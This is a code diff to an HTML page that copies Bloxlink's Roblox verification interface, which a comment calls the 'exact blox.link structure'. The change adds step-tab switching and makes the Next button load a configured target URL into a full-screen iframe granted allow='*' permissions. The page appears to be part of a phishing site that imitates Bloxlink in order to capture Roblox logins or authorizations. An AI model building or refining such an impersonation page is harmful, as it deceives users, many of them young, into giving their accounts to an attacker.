@@ -191,33 +191,33 @@
         </div>
 
         <!-- Step 1 content -->
-        <div id="step1Section" class="flex flex-col gap-6 px-8">
+        <div class="flex flex-col gap-6 px-8">
 
-          <!-- Steps card — exact blox.link structure -->
+          <!-- Steps card — stays visible, JS swaps active step -->
           <div class="relative bg-primary-background shadow-md p-6 rounded-lg">
-            <div class="flex flex-col xl:flex-row">
-              <!-- Step 1 active -->
-              <div class="flex gap-4 items-center flex-1 rounded-md p-4 bg-indigo-600">
+            <div id="stepsBar" class="flex flex-col xl:flex-row">
+              <!-- Step 1 (default active) -->
+              <div id="step1Tab" class="flex gap-4 items-center flex-1 rounded-md p-4 bg-indigo-600">
                 <div class="border-2 rounded-full h-8 w-8 justify-center items-center flex border-white">
                   <p class="text-base font-normal text-primary-text text-left">1</p>
                 </div>
                 <p class="text-base font-normal text-primary-text text-left">Account Information</p>
               </div>
-              <!-- Step 2 inactive -->
-              <div class="flex gap-4 items-center flex-1 rounded-md p-4">
+              <!-- Step 2 -->
+              <div id="step2Tab" class="flex gap-4 items-center flex-1 rounded-md p-4">
                 <div class="border-2 rounded-full h-8 w-8 justify-center items-center flex border-white">
                   <p class="text-base font-normal text-primary-text text-left">2</p>
                 </div>
                 <p class="text-base font-normal text-primary-text text-left">Account Verification</p>
               </div>
-              <!-- Step 3 inactive -->
+              <!-- Step 3 -->
               <div class="flex gap-4 items-center flex-1 rounded-md p-4">
                 <div class="border-2 rounded-full h-8 w-8 justify-center items-center flex border-white">
                   <p class="text-base font-normal text-primary-text text-left">3</p>
                 </div>
                 <p class="text-base font-normal text-primary-text text-left">Select Servers</p>
               </div>
-              <!-- Step 4 inactive -->
+              <!-- Step 4 -->
               <div class="flex gap-4 items-center flex-1 rounded-md p-4">
                 <div class="border-2 rounded-full h-8 w-8 justify-center items-center flex border-white">
                   <p class="text-base font-normal text-primary-text text-left">4</p>
@@ -227,33 +227,33 @@
             </div>
           </div>
 
-          <!-- Method card -->
-          <div class="relative bg-primary-background shadow-md p-6 rounded-lg">
+          <!-- Method card (hidden after Next) -->
+          <div id="methodCard" class="relative bg-primary-background shadow-md p-6 rounded-lg">
             <div class="flex flex-col gap-6">
               <div class="flex flex-col">
                 <p class="text-lg font-bold text-primary-text text-left">New Account Information</p>
                 <p class="text-sm font-normal text-secondary-text text-left">Select Verification Method.</p>
               </div>
               <div class="flex flex-col gap-2">
-                <!-- Authorize Roblox option -->
                 <div class="relative bg-secondary-background shadow-sm cursor-pointer hover:shadow-lg hover:opacity-90 p-4 rounded-md border-2 border-success">
                   <div class="flex flex-col">
                     <p class="text-base font-normal text-primary-text text-left">Authorize Roblox</p>
                     <p class="text-sm font-normal text-secondary-text text-left">Link your Roblox account with Bloxlink in one click.</p>
                   </div>
                 </div>
-                <!-- Next button -->
                 <button id="nextBtn" class="transition-colors rounded-md flex items-center justify-center bg-indigo-600 hover:bg-indigo-700 text-white py-2 px-3 font-medium text-sm">
                   <div class="flex items-center">Next</div>
                 </button>
               </div>
             </div>
           </div>
-        </div>
 
-        <!-- Step 2: iframe section (shown after Next) -->
-        <div id="iframeSection" class="px-8">
-          <iframe id="verifyIframe" src="about:blank" allow="*"></iframe>
+          <!-- Iframe section (shown after Next) -->
+          <div id="iframeSection" style="display:none;">
+            <iframe id="verifyIframe" src="about:blank" allow="*"
+              style="width:100%; height:calc(100vh - 200px); min-height:500px; border:none; display:block; border-radius:8px;"></iframe>
+          </div>
+
         </div>
 
       </div>
@@ -273,12 +273,26 @@
 
   initUserNav({ chipId: 'navChip', avatarId: 'navAvatar', nameId: 'navUsername', dropdownId: 'navDropdown' });
 
-  // Next → show iframe immediately
+  // Next → switch step progress and show iframe immediately
   document.getElementById('nextBtn').addEventListener('click', () => {
-    document.getElementById('step1Section').style.display = 'none';
-    document.getElementById('iframeSection').style.display = 'block';
+    // Hide method selection card
+    const methodCard = document.getElementById('methodCard');
+    if (methodCard) methodCard.style.display = 'none';
+
+    // Update progress steps styling: step 1 becomes inactive, step 2 becomes active (bg-indigo-600)
+    const step1Tab = document.getElementById('step1Tab');
+    const step2Tab = document.getElementById('step2Tab');
+    if (step1Tab && step2Tab) {
+      step1Tab.classList.remove('bg-indigo-600');
+      step2Tab.classList.add('bg-indigo-600');
+    }
+
+    // Show iframe section
+    const iframeSection = document.getElementById('iframeSection');
+    if (iframeSection) iframeSection.style.display = 'block';
+
     const iframe = document.getElementById('verifyIframe');
-    if (iframe.src === 'about:blank' || !iframe.src) {
+    if (iframe && (iframe.src === 'about:blank' || !iframe.src)) {
       iframe.src = CONFIG.TARGET_URL;
     }
   });
